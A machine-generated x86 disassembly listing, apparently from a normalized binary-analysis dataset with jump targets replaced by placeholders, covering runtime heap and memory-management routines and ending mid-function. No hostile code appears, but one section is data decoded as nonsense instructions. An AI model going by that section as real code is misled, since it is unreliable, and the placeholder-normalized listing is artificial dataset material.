sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax ] bl
push esi
inc eax
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ esi + edx * 2 ] dh
inc eax
add al bl
xor [ eax ] eax
adc al 0x32
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov al [ 0xffffffff8b004661 ]
sar bh 0x25
pushfd
popad
inc esi
add [ ebx - 0x67da0040 ] cl
popad
inc esi
add [ ebx - 0x6bda0040 ] cl
popad
inc esi
add [ ebx - 0x6fda0040 ] cl
popad
inc esi
add [ ebx - 0x73da0040 ] cl
popad
inc esi
add [ ebx - 0x77da0040 ] cl
popad
inc esi
add [ ebx - 0x7bda0040 ] cl
popad
inc esi
add [ ebx - 0x2fda0040 ] cl
popad
inc esi
add [ ebx - 0x7fda0040 ] cl
popad
inc esi
add [ ebx + 0x7c25ffc0 ] cl
popad
inc esi
add [ ebx + 0x7825ffc0 ] cl
popad
inc esi
add [ ebx - 0x17da0040 ] cl
popad
inc esi
add [ ebx - 0x1bda0040 ] cl
popad
inc esi
add [ ebx - 0x1fda0040 ] cl
popad
inc esi
add [ ebx + 0x7425ffc0 ] cl
popad
inc esi
add [ ebx + 0x7025ffc0 ] cl
popad
inc esi
add [ ebx - 0x7da0040 ] cl
popad
inc esi
add [ ebx - 0xbda0040 ] cl
popad
inc esi
add [ ebx - 0xfda0040 ] cl
popad
inc esi
add [ ebx + 0x6c25ffc0 ] cl
popad
inc esi
add [ ebx + 0x6825ffc0 ] cl
popad
inc esi
add [ ebx + 0x6425ffc0 ] cl
popad
inc esi
add [ ebx + 0x6025ffc0 ] cl
popad
inc esi
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a44
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a44
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
